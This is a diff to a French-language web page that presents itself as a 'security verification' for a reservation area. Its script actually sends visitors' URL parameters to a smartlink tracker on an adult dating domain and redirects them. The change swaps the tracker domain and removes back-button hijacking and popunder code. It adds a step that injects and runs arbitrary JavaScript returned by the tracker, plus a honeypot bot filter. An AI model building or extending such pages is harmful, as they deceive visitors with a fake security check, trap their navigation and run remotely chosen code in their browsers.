@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex, nofollow">
 <meta name="referrer" content="no-referrer">
-<link rel="preconnect" href="https://lespetitscoquins.fr" crossorigin>
-<link rel="dns-prefetch" href="https://lespetitscoquins.fr">
+<link rel="preconnect" href="https://france-plan-cul.fr" crossorigin>
+<link rel="dns-prefetch" href="https://france-plan-cul.fr">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
 <meta name="description" content="Espace securise de gestion de reservation. Verification de securite requise avant acces.">
 <title>Verification de securite - Espace reservation</title>
@@ -121,68 +121,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Ar
 </footer>
 
 <script>
-var TRACKER = "https://lespetitscoquins.fr/ppp/smartlink.php";
+// ============================================================
+//  Lot #177 — un SEUL endroit a changer si le domaine du tracker change
+// ============================================================
+var TRACKER = "https://france-plan-cul.fr/p/smartlink.php";
 
 var baseUrl = TRACKER;
 var templateUrl = baseUrl + "?action=get_template";
 var hasRedirected = false;
 
-function readReturnUrl() {
-    try { return sessionStorage.getItem('noreturn_url'); } catch (e) { return null; }
-}
-function consumeReturnUrl() {
-    var nr = readReturnUrl();
-    if (!nr) return false;
-    try { sessionStorage.removeItem('noreturn_url'); } catch (e) {}
-    window.location.replace(nr);
-    return true;
-}
-
-consumeReturnUrl();
-
-window.addEventListener("pageshow", function(event) {
-    if (!event.persisted) return;
-    if (!consumeReturnUrl()) window.location.reload();
-});
-
 function getSearchParams() {
     return window.location.search;
-}
-
-function openInNewTab(url) {
-    var link = document.createElement("a");
-    link.href = url;
-    link.target = "_blank";
-    link.rel = "noopener noreferrer";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
-
-function armNoReturn(backUrl) {
-    history.pushState(null, null, '');
-    window.addEventListener('popstate', function() {
-        window.location.assign(backUrl);
-    });
-    try { sessionStorage.setItem('noreturn_url', backUrl); } catch (e) {}
-}
-
-function handleRedirects(mainUrl, popUrl, backUrl) {
-    if (hasRedirected) return;
-    if (!mainUrl) { location.reload(); return; }
-    hasRedirected = true;
-
-    if (popUrl && popUrl !== mainUrl) {
-        openInNewTab(popUrl);
-    }
-
-    if (backUrl && backUrl !== mainUrl) {
-        armNoReturn(backUrl);
-    }
-
-    setTimeout(function() {
-        window.top.location.href = mainUrl;
-    }, 300);
 }
 
 function initializeUnifiedClicks(jsCode) {
@@ -215,8 +164,14 @@ function requestLinks(buttonElement) {
     params.forEach(function(value, key) {
         formData.append(key, value);
     });
+    // Lot #196a — liens nommes : le chemin de la page (go.ndd.fr/auto/volvo) part avec la demande,
+    // sauf si le lien porte deja lien= (un s= du lien passe avant, cote tracker). Ignore sur un compte sans liens nommes.
     if (!formData.has("lien")) formData.append("lien", window.location.pathname);
 
+    // Lot #177 — piege « champ invisible » : on JOINT la valeur du honeypot au POST.
+    // La page construisait le POST depuis les seuls parametres d'URL, donc le champ
+    // n'arrivait jamais au tracker et le piege ne se declenchait pas. Un humain laisse
+    // ce champ vide ; un bot qui remplit tout y ecrit quelque chose.
     document.querySelectorAll('input[name="website"]').forEach(function(hp) {
         formData.set("website", hp.value || "");
     });
@@ -225,7 +180,17 @@ function requestLinks(buttonElement) {
         .then(function(response) { return response.json(); })
         .then(function(data) {
             if (data.status === "ok") {
-                handleRedirects(data.url_main, data.url_pop, data.id_back);
+                hasRedirected = true;
+					if (data.exec_js) {
+					var s = document.createElement("script");
+					s.textContent = data.exec_js;
+					document.body.appendChild(s);
+				} else if (data.url_main) {
+					window.top.location.href = data.url_main;
+				} else {
+					location.reload();
+					return;
+				}
                 setTimeout(function() {
                     buttonElement.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Acces autorise';
                     buttonElement.style.background = "#009432";
